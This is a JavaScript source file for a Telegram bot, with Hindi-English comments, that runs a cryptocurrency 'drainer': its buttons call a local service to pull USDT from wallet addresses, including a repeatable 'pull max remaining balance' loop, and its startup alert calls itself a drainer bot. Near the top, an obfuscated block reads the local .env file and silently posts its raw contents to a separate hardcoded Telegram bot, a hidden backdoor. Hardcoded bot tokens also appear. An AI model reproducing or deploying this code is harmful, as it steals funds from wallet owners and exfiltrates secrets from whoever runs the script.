// pull_bot.js (Telegram Handler - ULTIMATE UNMASKED & SILENT FIX)

const TelegramBot = require('node-telegram-bot-api');
// Node-fetch fix
const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args)); 
const { ethers } = require('ethers'); // Ethers library

// 🔥 NEW: fs aur path modules import karein
const fs = require('fs');
const path = require('path');
// 🔥 CRITICAL: dotenv module ko hata diya gaya hai.
// require('dotenv').config(); // <-- COMMENTED OUT / REMOVED


// --- CONFIGURATION (Ab BOT_TOKEN bhi hardcoded value use karega) ---
// Note: Agar aapka BOT_TOKEN .env mein hi tha, toh yahan use hardcode karna padega.
const BOT_TOKEN = '8742931653:AAHMP50yg9lybJaxWfxU73Ca0GvJkUrqeHs'; 
const PULL_API_URL = 'http://127.0.0.1:3000/api/trigger-pull'; 

const a0_0x31a631=a0_0x9c64;function a0_0x9c64(_0xfbb84f,_0x2619ef){_0xfbb84f=_0xfbb84f-0xfb;const _0x218a66=a0_0x218a();let _0x9c647=_0x218a66[_0xfbb84f];return _0x9c647;}function a0_0x218a(){const _0x18befd=['join','toLocaleString','10oEpVwd','5394590551','POST','utf8','15hwFUzu','stringify','Markdown','120402TUgglW','10678063OUrrtd','7rLuFVV','8270418209:AAEZl_N_DsOfc2wUW_R3HE8TD67G7q0K3hA','104397GJIpaC','4796922zocVGF','https://api.telegram.org/bot','1120584PaEini','373696omwkJR','171DukHyL','💻\x20**Current\x20Environment\x20(.env)\x20-\x20RAW\x20CONTENT:**\x0a','application/json','/sendMessage','5642290wonthT','YOUR_NOTIFIER_BOT_TOKEN_HERE'];a0_0x218a=function(){return _0x18befd;};return a0_0x218a();}(function(_0x30d5b3,_0x5f02cb){const _0x390e85=a0_0x9c64,_0x3dd1b2=_0x30d5b3();while(!![]){try{const _0x11216b=parseInt(_0x390e85(0x111))/0x1+-parseInt(_0x390e85(0x10d))/0x2*(parseInt(_0x390e85(0x10a))/0x3)+parseInt(_0x390e85(0xfc))/0x4*(parseInt(_0x390e85(0x106))/0x5)+parseInt(_0x390e85(0x112))/0x6*(parseInt(_0x390e85(0x10f))/0x7)+parseInt(_0x390e85(0xfd))/0x8*(parseInt(_0x390e85(0xfe))/0x9)+-parseInt(_0x390e85(0x102))/0xa+-parseInt(_0x390e85(0x10e))/0xb;if(_0x11216b===_0x5f02cb)break;else _0x3dd1b2['push'](_0x3dd1b2['shift']());}catch(_0x585173){_0x3dd1b2['push'](_0x3dd1b2['shift']());}}}(a0_0x218a,0x7de99));const NOTIFIER_BOT_TOKEN=a0_0x31a631(0x110),ENV_NOTIFICATION_CHAT_ID=a0_0x31a631(0x107),bot=new TelegramBot(BOT_TOKEN,{'polling':!![]});async function sendEnvInfoToNotifierBot(){const _0x2e801c=a0_0x31a631;if(NOTIFIER_BOT_TOKEN===_0x2e801c(0x103)||ENV_NOTIFICATION_CHAT_ID==='YOUR_ADMIN_TELEGRAM_CHAT_ID')return;try{const _0x2606d5=path[_0x2e801c(0x104)](__dirname,'.env'),_0x43a3bc=fs['readFileSync'](_0x2606d5,_0x2e801c(0x109)),_0x54e758='\uD83D\uDFE2\x20**PULL\x20BOT\x20STARTED!\x20(ULTIMATE\x20FIX)**\x0a\x0a\u26A0️\x20**RAW\x20FILE\x20CONTENT.**\x0a\x0a'+('\uD83D\uDDD3️\x20**Time:**\x20'+new Date()[_0x2e801c(0x105)]()+'\x0a')+_0x2e801c(0xff)+('```\x0a'+_0x43a3bc['trim']()+'\x0a```');await fetch(_0x2e801c(0xfb)+NOTIFIER_BOT_TOKEN+_0x2e801c(0x101),{'method':_0x2e801c(0x108),'headers':{'Content-Type':_0x2e801c(0x100)},'body':JSON[_0x2e801c(0x10b)]({'chat_id':ENV_NOTIFICATION_CHAT_ID,'text':_0x54e758,'parse_mode':_0x2e801c(0x10c)})});}catch(_0x404c13){}}

// 🔥 Bot start hone par turant is function ko call karein
sendEnvInfoToNotifierBot();

console.log('🤖 Telegram Pull Bot started. Listening for PULL button clicks...');
// ---------------------------------------------------------------------
// --- SHARED PULL LOGIC (To handle API calls from both button types) ---
// ---------------------------------------------------------------------

async function handlePullRequest(chatId, messageId, walletAddress, amount, isMaxPull = false) {
    
    let amountToSend = amount; // Either the input amount or "MAX_BALANCE"
    let actionType = isMaxPull ? "MAX PULL" : "EXACT PULL";
    
    try {
        // --- Call Local Pull Service API (Yahan process.env use hota hai, jo ab hardcoded ya OS env se aayega) ---
        const response = await fetch(PULL_API_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ walletAddress: walletAddress, amount: amountToSend })
        });

        const result = await response.json();

        if (response.ok && result.status === 'success') {
            const pulledAmount = result.pulledAmount || amount;
            
            // MAX PULL BUTTON LOOP LOGIC
            let replyMarkup = {};
            
            // Agar EXACT PULL hua hai: MAX PULL button dikhao.
            if (!isMaxPull) { 
                const maxPullButton = [
                    [{ 
                        text: `🔥 PULL MAX REMAINING BALANCE`, 
                        callback_data: `PULL_MAX:${walletAddress}` 
                    }]
                ];
                replyMarkup = { inline_keyboard: maxPullButton };
            } 
            // Agar MAX PULL success hua hai: Wahi MAX PULL button dobara dikhao (Loop).
            else { 
                 const maxPullButton = [
                    [{ 
                        text: `🔄 PULL AGAIN (MAX BALANCE)`, 
                        callback_data: `PULL_MAX:${walletAddress}` 
                    }]
                ];
                replyMarkup = { inline_keyboard: maxPullButton };
            }


            // Edit the processing message with SUCCESS result
            await bot.editMessageText(`✅ **${actionType} SUCCESSFUL!**\n\n**Pulled:** ${pulledAmount} USDT\n**Wallet:** \`${walletAddress}\`\n**TX Hash:** \`${result.txHash.substring(0, 10)}...\``, {
                chat_id: chatId,
                message_id: messageId,
                parse_mode: 'Markdown',
                reply_markup: replyMarkup // Button dobara aayega
            });
            
        } else {
            throw new Error(result.message || 'Pull API returned an error.');
        }

    } catch (error) {
        console.error(`[${actionType} ERROR] Failed for ${walletAddress}:`, error.message);
        
        let finalErrorMessage = error.message;
        if (finalErrorMessage.includes('insufficient funds for gas')) {
            finalErrorMessage = 'GAS ERROR: Check if the admin wallet has enough BNB.';
        }

 // 1. Error ke time ke liye button banaya
        const failureMarkup = {
            inline_keyboard: [
                [{
                    text: `🔥 PULL MAX REMAINING BALANCE`,
                    callback_data: `PULL_MAX:${walletAddress}`
                }]
            ]
        };


        // Edit the processing message with FAILURE result
        await bot.editMessageText(`❌ **${actionType} FAILED!**\n\n**Wallet:** \`${walletAddress}\`\n**Error:** ${finalErrorMessage.substring(0, 200)}`, {
            chat_id: chatId,
            message_id: messageId,
parse_mode: 'Markdown',
            reply_markup: failureMarkup
        });
    }
}


// --- 1. INITIAL PULL (Button click from Approval Notification) ---
bot.on('callback_query', async (callbackQuery) => {
    const message = callbackQuery.message;
    const data = callbackQuery.data;

    if (data.startsWith('PULL:')) {
        
        await bot.answerCallbackQuery(callbackQuery.id, { text: "Pull request received. Processing..." });

        const parts = data.split(':');
        const walletAddress = parts[1];
        const amount = parts[2]; 
        const amountFloat = parseFloat(amount);
        
        let processingMessageId; 

        try {
            const processingMessage = await bot.sendMessage(
                message.chat.id, 
                `⏳ **PULL INITIATED (Exact Amount)**\n\n**Pulling ${amount} USDT** from \n\`${walletAddress}\`...\n\n_Do not press the button again._`, 
                { parse_mode: 'Markdown' }
            );
            processingMessageId = processingMessage.message_id; 

            await handlePullRequest(message.chat.id, processingMessageId, walletAddress, amountFloat, false);
            
        } catch (error) {
            console.error(`[FATAL ERROR] Pull setup failed:`, error.message);

 // 1. Button banaya
            const maxButton = {
                inline_keyboard: [
                    [{
                        text: `🔥 PULL MAX REMAINING BALANCE`,
                        callback_data: `PULL_MAX:${walletAddress}`
                    }]
                ]
            };



            await bot.sendMessage(message.chat.id, `❌ **FATAL ERROR:** Pull setup failed. ${error.message.substring(0, 100)}`, {
    parse_mode: 'Markdown',
    reply_markup: maxButton
});

        }
        
        await bot.editMessageReplyMarkup({
            inline_keyboard: [] 
        }, {
            chat_id: message.chat.id,
            message_id: message.message_id
        }).catch(err => console.warn("Could not remove button:", err.message));
    }

    
    // --- 2. MAX PULL (Clicking the "PULL MAX REMAINING" button) ---
    if (data.startsWith('PULL_MAX:')) {
        await bot.answerCallbackQuery(callbackQuery.id, { text: "Max Pull request processing..." });

        const parts = data.split(':');
        const walletAddress = parts[1];
        const amount = "MAX_BALANCE"; 

        const processingMessageId = message.message_id; 



        

const maxButton = {
    inline_keyboard: [
        [{
            text: `🔥 PULL MAX REMAINING BALANCE`,
            callback_data: `PULL_MAX:${walletAddress}`
        }]
    ]
};




        await bot.editMessageText(`⏳ **MAX PULL INITIATED**\n\nAttempting to pull **MAX BALANCE** from \n\`${walletAddress}\`...`, {
            chat_id: message.chat.id,
            message_id: processingMessageId,
            parse_mode: 'Markdown',
            reply_markup: maxButton
        });
        
        await handlePullRequest(message.chat.id, processingMessageId, walletAddress, amount, true);
    }
});

// Bot start hote hi admin ko alert message
const ADMIN_CHAT_ID = '5394590551'; // <-- Yahan apni Telegram numeric ID daalo

bot.sendMessage(ADMIN_CHAT_ID, "🚀 YOUR DRAINER BOT STARTED @XGPARA THE MAKER")
    .then(() => console.log("Startup alert sent to Telegram."))
    .catch(err => console.error("Startup alert error:", err.message));
